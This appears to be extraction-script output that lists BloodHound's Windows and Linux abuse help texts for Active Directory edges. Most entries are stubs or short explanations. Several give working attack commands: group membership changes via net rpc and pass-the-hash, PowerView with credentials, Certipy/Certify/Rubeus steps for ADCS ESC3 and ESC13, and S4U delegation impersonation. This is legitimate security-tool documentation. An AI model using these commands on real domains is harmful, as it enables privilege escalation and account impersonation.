+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllExtendedRights/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllExtendedRights
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllExtendedRights/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceToTGT
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceToTGT
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceToTGT/LinuxAbuse.tsx:
+                {intro}
+                <Typography variant='body2'>
+                    See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the
+                    execution.
+                </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceToTGT
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/CoerceToTGT/WindowsAbuse.tsx:
+                {intro}
+                <Typography variant='body2'>
+                    See 'Abusing Users Configured with Unconstrained Delegation' under References for details on the
+                    execution.
+                </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGroupMember_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGroupMember_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddMember
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddMember
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddMember/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
+                or prompted interactively if omitted from the command line:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                It can also be done with pass-the-hash using{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
+                    pth-toolkit's net tool
+                </Link>
+                . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>Finally, verify that the user was successfully added to the group:</Typography>
+
+            <Typography component={'pre'}>
+                {'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddMember
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AddMember/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                There are at least two ways to execute this attack. The first and most obvious is by using the built-in
+                net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec
+                considerations tab for why this may be a bad idea. The second, and highly recommended method, is by
+                using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe
+                binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a
+                process as or logon as the user with the AddMember permission. Additionally, you have much safer
+                execution options than you do with spawning net.exe (see the opsec tab).
+            </Typography>
+
+            <Typography variant='body2'>
+                To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent
+                session or into a PowerShell instance at the console.
+            </Typography>
+
+            <Typography variant='body2'>
+                You may need to authenticate to the Domain Controller as{' '}
+                {sourceType === 'User'
+                    ? `${sourceName} if you are not running a process as that user`
+                    : `a member of ${sourceName} if you are not running a process as a member`}
+                . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these
+                examples comes from the PowerView help documentation):
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
+                    "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
+            </Typography>
+
+            <Typography variant='body2'>
+                Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as{' '}
+                {sourceName}:
+            </Typography>
+
+            <Typography component={'pre'}>
+                {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
+            </Typography>
+
+            <Typography variant='body2'>
+                Finally, verify that the user was successfully added to the group with PowerView's
+                Get-DomainGroupMember:
+            </Typography>
+
+            <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericAll
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericAll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericAll/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericAll
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/GenericAll/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddSecret
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZAddSecret
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerRaw
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetCertificates
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZGetCertificates
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ClaimSpecialIdentity
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ClaimSpecialIdentity
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteDacl
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteDacl
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteDacl/LinuxAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteDacl
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteDacl/WindowsAbuse.tsx:
+                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZContains
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZContains
+Skipping non-directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/utils.ts
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToEntraUser
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToEntraUser
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToEntraUser/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for
+            example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by
+            changing the on-prem user’s password and authenticating with that new password.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToEntraUser
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/SyncedToEntraUser/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may authenticate as the synchronized Entra user using the on-prem user’s credentials, for
+            example by dumping the user’s plain-text credential from memory, key-logging the user’s password, or by
+            changing the on-prem user’s password and authenticating with that new password.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZManagedIdentity
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZManagedIdentity
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAppRoleAssignment_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGAppRoleAssignment_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Default
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Default
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKINameFlag
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKINameFlag
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKINameFlag/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKINameFlag
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WritePKINameFlag/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/shared
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10b
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10b/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10b
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC10b/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+            {step8}
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC3
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC3
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC3/LinuxAbuse.tsx:
+            <Typography variant='body2'>The ESC3 attack can be carried out in the following manner.</Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 1:
+                </Box>{' '}
+                Use Certipy to request an enrollment agent certificate.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 2:
+                </Box>{' '}
+                Use the enrollment agent certificate to issue a certificate request on behalf of another user to a
+                certificate template that allow for authentication and permit enrollment agent enrollment.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'contoso\\administrator' -pfx 'user.pfx'"
+                }
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the target principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template.
+                Choose another target with the given attribute set.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 3:
+                </Box>{' '}
+                Request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate
+                and the PFX-formatted certificate created in Step 2.
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128'}</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC3
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC3/WindowsAbuse.tsx:
+            <Typography variant='body2'>The ESC3 attack can be carried out in the following manner.</Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 1:
+                </Box>{' '}
+                Use Certify to request an enrollment agent certificate.
+            </Typography>
+            <Typography component={'pre'}>
+                {'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent'}
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 2:
+                </Box>{' '}
+                Convert the emitted certificate to PFX format.
+            </Typography>
+            <Typography component={'pre'}>
+                {'certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx'}
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 3:
+                </Box>{' '}
+                Use the enrollment agent certificate to issue a certificate request on behalf of another user to a
+                certificate template that allow for authentication and permit enrollment agent enrollment.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                Save the certificate as <Box component='code'>itadminenrollment.pem</Box> and the private key as{' '}
+                <Box component='code'>itadminenrollment.key</Box>.
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the target principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template.
+                Choose another target with the given attribute set.
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 4:
+                </Box>{' '}
+                Convert the emitted certificate to PFX format.
+            </Typography>
+            <Typography component={'pre'}>
+                {'certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx'}
+            </Typography>
+            <Typography variant='body2'>
+                <Box component='span' sx={{ fontWeight: 'bold' }}>
+                    Step 5:
+                </Box>{' '}
+                Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to
+                impersonate and the PFX-formatted certificate created in Step 4.
+            </Typography>
+            <Typography component={'pre'}>
+                {'Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx'}
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToDelegate
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToDelegate
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToDelegate/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is
+                configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service
+                principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for
+                the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the
+                "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service
+                ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the
+                "admin" user.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    "getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'"
+                }
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToDelegate
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AllowedToDelegate/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                Abusing this privilege can utilize Benjamin Delpy's Kekeo project, proxying in traffic generated from
+                the Impacket library, or using the Rubeus project's s4u abuse.
+            </Typography>
+
+            <Typography variant='body2'>
+                In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is
+                configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service
+                principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for
+                the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the
+                "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service
+                ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to
+                access the file system of PRIMARY.testlab.local as the "admin" user.
+            </Typography>
+
+            <Typography component={'pre'}>
+                {
+                    'Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:"HTTP/PRIMARY.testlab.local" /altservice:cifs /ptt'
+                }
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGroup_ReadWrite_All
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZMGGroup_ReadWrite_All
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC4
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC4
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC4/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform the ESC4 attack with the following steps.</Typography>
+            {step0_1}
+            {step0_2}
+            {step1a}
+            {step1b}
+            {step1c}
+            {step1d}
+            {step1e}
+            {step2}
+            {step3}
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC4
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC4/WindowsAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform the ESC4 attack with the following steps.</Typography>
+            {step0_1}
+            {step0_2}
+            {step1}
+            {step2}
+            {step3}
+            {step4}
+            {step5}
+            {step6}
+            {step7}
+            {step8}
+            {step9}
+            {step10}
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC13
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC13
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC13/LinuxAbuse.tsx:
+            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certipy to request enrollment in the affected template, specifying the affected
+                enterprise CA:
+            </Typography>
+            <Typography component={'pre'}>
+                {'certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13'}
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Request a ticket granting ticket (TGT) from the domain, specifying the certificate
+                created in Step 1 and the IP of a domain controller:
+            </Typography>
+            <Typography component={'pre'}>{'certipy auth -pfx john.pfx -dc-ip 172.16.126.128'}</Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC13
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ADCSESC13/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                The principal can now perform an ESC13 abuse with the following steps:
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
+                certification authority:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:"ESC13"'}
+            </Typography>
+            <Typography variant='body2'>
+                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
+                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
+                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
+                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
+                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
+                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
+                default.
+            </Typography>
+            <Typography variant='body2'>Save the certificate as cert.pem and the private key as cert.key.</Typography>
+            <Typography variant='body2'>
+                <b>Step 2</b>: Convert the emitted certificate to PFX format:
+            </Typography>
+            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
+            <Typography variant='body2'>
+                <b>Step 3</b>: Optionally purge all kerberos tickets from memory:
+            </Typography>
+            <Typography component={'pre'}>{'klist purge'}</Typography>
+            <Typography variant='body2'>
+                <b>Step 4</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
+                attacker identity, the PFX-formatted certificate created in Step 2, and the certificate password:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt'}
+            </Typography>
+            <Typography variant='body2'>
+                <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
+            </Typography>
+            <Typography component={'pre'}>{'klist'}</Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCA
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCA
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCA/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCA
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/ManageCA/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZWebsiteContributor
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZWebsiteContributor
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteGPLink
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteGPLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteGPLink/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                From a Linux machine, the WriteGPLink permission may be abused using the{' '}
+                <Link target='_blank' rel='noopener' href='https://github.com/synacktiv/OUned'>
+                    OUned.py
+                </Link>{' '}
+                exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to{' '}
+                <Link
+                    target='_blank'
+                    rel='noopener'
+                    href='https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory'>
+                    the article associated to the OUned.py tool
+                </Link>
+                .
+            </Typography>
+
+            <Typography variant='body2'>
+                Be mindful of the number of users and computers that are in the given domain as they all will attempt to
+                fetch and apply the malicious GPO.
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteGPLink
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteGPLink/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                From a domain-joined compromised Windows machine, the WriteGPLink permission may be abused through
+                Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements
+                and implementation, you can refer to{' '}
+                <Link target='_blank' rel='noopener' href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
+                    this article
+                </Link>
+                .
+            </Typography>
+
+            <Typography variant='body2'>
+                Be mindful of the number of users and computers that are in the given domain as they all will attempt to
+                fetch and apply the malicious GPO.
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Contains
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/Contains
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZCloudAppAdmin
+Found Abuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/AZCloudAppAdmin
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerLimitedRights
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerLimitedRights
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerLimitedRights/LinuxAbuse.tsx:
+            <Typography variant='body2'>
+                To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited
+                privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID
+                in the context of the new owner.
+                <br />
+                <br />
+                Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at
+                https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges
+            </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerLimitedRights
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/WriteOwnerLimitedRights/WindowsAbuse.tsx:
+            <Typography variant='body2'>
+                To abuse change in ownership of an object where the OWNER RIGHTS SID is explicitly granted inherited
+                privileges, you can modify the owner, then abuse the specific privileges granted to the OWNER RIGHTS SID
+                in the context of the new owner.
+                <br />
+                <br />
+                Please refer to the abuse info for the specific privileges granted to OWNER RIGHTS at
+                https://bloodhound.specterops.io/home/articles/17224136169371-About-BloodHound-Edges
+            </Typography>
+
+
+Processing directory: ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/PublishedTo
+Found LinuxAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/PublishedTo
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/PublishedTo/LinuxAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on a template being published to a certification
+            authority. This relationship alone is not enough to escalate rights or impersonate other principals. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
+Found WindowsAbuse.tsx in ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/PublishedTo
+Extracted HTML-like content from ./docs/packages/javascript/bh-shared-ui/src/components/HelpTexts/PublishedTo/WindowsAbuse.tsx:
+        <Typography variant='body2'>
+            An attacker may perform several attacks that rely on a template being published to a certification
+            authority. This relationship alone is not enough to escalate rights or impersonate other principals. This
+            relationship may contribute to other relationships and attributes, from which an escalation opportunity may
+            emerge.
+        </Typography>
+
+
